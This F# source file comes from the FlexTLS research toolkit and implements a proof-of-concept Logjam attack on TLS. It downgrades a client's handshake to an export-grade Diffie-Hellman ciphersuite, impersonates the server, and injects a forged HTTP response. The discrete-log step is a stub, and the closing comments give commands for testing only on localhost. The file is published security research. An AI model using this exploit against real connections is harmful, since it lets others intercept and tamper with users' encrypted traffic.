(*
 * Copyright 2015 INRIA and Microsoft Corporation
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *)

#light "off"

module FlexApps.Attack_Logjam

open Bytes
open Error
open TLSInfo
open TLSConstants
open HandshakeMessages
open TLSError

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexAppData
open FlexRecord
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexServerHelloDone
open FlexServerKeyExchange
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets
open FlexHandshake
open FlexAlert

open NLog
open NLog.Targets

open System.IO
open Org.BouncyCastle.Math

let dhe_ciphersuites =
    [ TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
    ; TLS_DHE_DSS_WITH_AES_256_GCM_SHA384
    ; TLS_DHE_RSA_WITH_AES_256_CBC_SHA256
    ; TLS_DHE_DSS_WITH_AES_256_CBC_SHA256
    ; TLS_DHE_RSA_WITH_AES_256_CBC_SHA
    ; TLS_DHE_DSS_WITH_AES_256_CBC_SHA
    ; TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
    ; TLS_DHE_DSS_WITH_AES_128_GCM_SHA256
    ; TLS_DHE_RSA_WITH_AES_128_CBC_SHA256
    ; TLS_DHE_DSS_WITH_AES_128_CBC_SHA256
    ; TLS_DHE_RSA_WITH_AES_128_CBC_SHA
    ; TLS_DHE_DSS_WITH_AES_128_CBC_SHA
    ; TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
    ; TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
    ]

let parseServerHello data =
    if length data >= 34 then
        let (serverVerBytes,serverRandomBytes,data) = split2 data 2 32 in
        match parseVersion serverVerBytes with
        | Error z -> Error z
        | Correct(serverVer) ->
            if length data >= 1 then
                match vlsplit 1 data with
                | Error z -> Error z
                | Correct (res) ->
                    let (sid,data) = res in
                    if length sid <= 32 then
                        if length data >= 3 then
                            let (csBytes,cmBytes,data) = split2 data 2 1 in
                            match parseCompression cmBytes with
                            | Error(z) -> Error(z)
                            | Correct(cm) ->
                              correct(serverVer,serverRandomBytes,sid,cm,data)
                        else Error(AD_decode_error, perror __SOURCE_FILE__ __LINE__ "")
                    else Error(AD_decode_error, perror __SOURCE_FILE__ __LINE__ "")
            else Error(AD_decode_error, perror __SOURCE_FILE__ __LINE__ "")
    else Error(AD_decode_error, perror __SOURCE_FILE__ __LINE__ "")

type Attack_Logjam =
    class

    static member run(listen_addr, connect_addr:string, ?listen_port:int, ?connect_port:int) : state * state =
        let connect_port = defaultArg connect_port FlexConstants.defaultTCPPort in
        let listen_port  = defaultArg listen_port FlexConstants.defaultTCPPort in

        // Setup Logger
        let config = new Config.LoggingConfiguration() in
        let consoleTarget = new ColoredConsoleTarget() in
        let rule0 = new Config.LoggingRule("*", LogLevel.Debug, consoleTarget) in
        let rule1 = new ConsoleWordHighlightingRule("", ConsoleOutputColor.White, ConsoleOutputColor.DarkBlue) in
        rule1.Regex <- "username=[^.]*";
        config.AddTarget("console", consoleTarget);
        consoleTarget.Layout <- new Layouts.SimpleLayout("${date:format=HH\\:MM\\:ss} ${message}");
        config.LoggingRules.Add(rule0);
        consoleTarget.WordHighlightingRules.Add(rule1);
        LogManager.Configuration <- config;
        LogManager.GlobalThreshold <- LogLevel.Info;
        let Log = LogManager.GetLogger("file") in

        // Start Man-In-The-Middle
        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections(
          listen_addr, connect_addr, listen_port=listen_port,
          server_cn=connect_addr, server_port=connect_port) in

        // Receive ClientHello
        let sst,snsc,sch = FlexClientHello.receive(sst) in

        // Send ClientHello with just one EXPORT ciphersuite to the Server
        let TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA = abyte2 (0x00uy, 0x14uy) in
        let _,_,payload,_ =
          match HandshakeMessages.parseMessage sch.payload with
          | Correct(Some(res)) -> res
          | _ -> failwith "Unexpected message: expected ClientHello"
        in
        let payload =
          match HandshakeMessages.parseClientHello payload with
          | Error z -> failwith "Malformed ClientHello"
          | Correct(pv,cr,sid,ccs,cm,ext) ->
            let cVerB      = versionBytes pv in
            let random     = cr in
            let csessB     = vlbytes 1 sid in
            let csb        = TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA in
            let ccsuitesB  = vlbytes 2 csb in
            let cmb        = compressionMethodsBytes cm in
            let ccompmethB = vlbytes 1 cmb in
            let data = cVerB @| (random @| (csessB @| (ccsuitesB @| (ccompmethB @| ext)))) in
            messageBytes HT_client_hello data;
        in
        let cst = FlexHandshake.send(cst,payload) in
        let cnsc =
          { FlexConstants.nullNextSecurityContext with
            si = { FlexConstants.nullSessionInfo with init_crand = sch.rand };
            crand = sch.rand;
          }
        in

        // Receive ServerHello
        let cst,_,csh,_ = FlexHandshake.receive(cst) in

        // Choose some DHE ciphersuite offered by the client
        let cs =
          match Handshake.negotiate (FlexClientHello.getCiphersuites sch) dhe_ciphersuites with
          | None -> failwith "Client didn't offer any DHE ciphersuite"
          | Some(cs) -> cs
        in
        let cch = { sch with ciphersuites = Some([cs]) } in

        // Send ServerHello with chosen DHE ciphersuite to the Client
        let payload =
          match parseServerHello csh with
          | Error z -> failwith "Malformed ServerHello"
          | Correct(pv,sr,sid,cm,ext) ->
            let sVerB      = versionBytes pv in
            let random     = sr in
            let ssessB     = vlbytes 1 sid in
            let csB        = cipherSuitesBytes [cipherSuite_of_name cs] in
            let scmB       = compressionBytes cm in
            let data = sVerB @| (random @| (ssessB @| (csB @| (scmB @| ext)))) in
            messageBytes HT_server_hello data;
        in
        let sst = FlexHandshake.send(sst,payload) in

        // Forward Certificate
        let cst,csnc,ccert = FlexCertificate.receive(cst,Client,cnsc) in
        let sst,snsc,_     = FlexCertificate.send(sst,Server,snsc,ccert) in

        // Forward ServerKeyExchange
        let cnsc =
          match parseServerHello csh with
          | Error z -> failwith "Malformed ServerHello"
          | Correct(pv,sr,sid,cm,ext) ->
            let si  = { cnsc.si with
              init_srand = sr;
              protocol_version = pv;
              sessionID = sid;
              cipher_suite = cipherSuite_of_name cs;
              compression = cm;
              extensions = FlexConstants.nullNegotiatedExtensions;
            } in
            { cnsc with
              si = si;
              srand = sr;
              secrets = cnsc.secrets;
            }
        in
        let cst,cnsc,cske = FlexServerKeyExchange.receiveDHE(cst,cnsc) in

        // Compute server's secret exponent
        let kex =
          match cnsc.secrets.kex with
          | DH(kex) -> kex
          | _       -> failwith "Unexpected non-DHE ServerKeyExchange message"
        in
        let pbytes,gbytes = kex.pg in
        Log.Info(sprintf "--- dh_p  = %s" (Bytes.hexString pbytes));
        Log.Info(sprintf "--- dh_g  = %s" (Bytes.hexString gbytes));
        Log.Info(sprintf "--- dh_Ys = %s" (Bytes.hexString kex.gy));
        let gy = BigInteger(1, cbytes kex.gy) in
        let y = BigInteger.One in // Replace with dlog oracle for a proper attack
        Log.Info(printf "--- Computed discrete log y = %s\n" (Bytes.hexString (abytes (y.ToByteArrayUnsigned()))));

        // Fill in server secrets
        let skex  = { kex with x = abytes (y.ToByteArrayUnsigned()); gx = kex.gy } in
        let skeys = { snsc.secrets with kex = DH(skex) } in
        let snsc  = { snsc with
          secrets = skeys;
          si      = { cnsc.si with cipher_suite = cipherSuite_of_name cs; };
          srand   = cnsc.srand;
        } in

        let sst = FlexHandshake.send(sst,cske.payload) in

        // We are done with the Server, gracefully close the connection
        let cst = { cst with
          write = { cst.write with epoch_init_pv = cnsc.si.protocol_version } } in
        let cst = FlexAlert.send(cst,TLSError.AD_close_notify) in
        Tcp.close cst.ns;

        // Send ServerHelloDone
        let sst,sshd = FlexServerHelloDone.send(sst) in

        // Receive ClientKeyExchange
        let sst,snsc,scke = FlexClientKeyExchange.receiveDHE(sst,snsc) in

        // Receive ClientCCS
        let sst,_,_ = FlexCCS.receive(sst) in

        // Install read keys
        let sst = FlexState.installReadKeys sst snsc in

        // Receive ClientFinished
        let sst,_ = FlexFinished.receive(sst,snsc,Client) in

        // Send ServerCCS
        let sst,_ = FlexCCS.send(sst) in

        // Install write keys
        let sst = FlexState.installWriteKeys sst snsc in

        // Send ServerFinished
        let sst,_ = FlexFinished.send(sst,snsc,Server) in

        // Receive an HTTP request
        Log.Info("--- Handshake complete, waiting for Client's request");
        let sst,_ = FlexAppData.receive(sst) in
        Log.Info("--- Got a request from the Client");

        // Inject response
        Log.Info("--- Injecting malicious data");
        let stream   = new StreamReader("data/logjam/scream.txt") in
        let response = stream.ReadToEnd() in
        let sst = FlexAppData.send(sst, sprintf "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s" (Core.String.length response) response) in

        sst,cst
 end

// For a description of the attack see https://weakdh.org/logjam.html#attack3
//
// To test the attack locally from the miTLS root directory:
//
// 1) Start server
// The parameters in data/logjam/dhparam.pem are such that OpenSSL will always choose 1 as the sercret server DH exponent.
// In practice, the server secret exponent for any export-grade parameters can be computed online after having done an offline pre-computation.
// $ openssl s_server -accept 4433 -cipher EXP-EDH-RSA-DES-CBC-SHA -no_ticket -tls1 -msg -cert tests/pki/rsa/certificates/rsa.cert-01.mitls.org.crt -key tests/pki/rsa/certificates/rsa.cert-01.mitls.org.key -dhparam data/logjam/dhparam.pem
//
// 2) Start MiTM
// ./flex/FlexApps/bin/Release/FlexApps -s logjam --connect 127.0.0.1:4433 --accept 127.0.0.1:6666
// which runs Attack_Logjam.run("127.0.0.1", "127.0.0.1", 6666, 4433)
//
// 3) Run client
// $ (echo "GET / HTTP/1.1"; sleep 5) | openssl s_client -connect 127.0.0.1:6666 -no_ticket -tls1
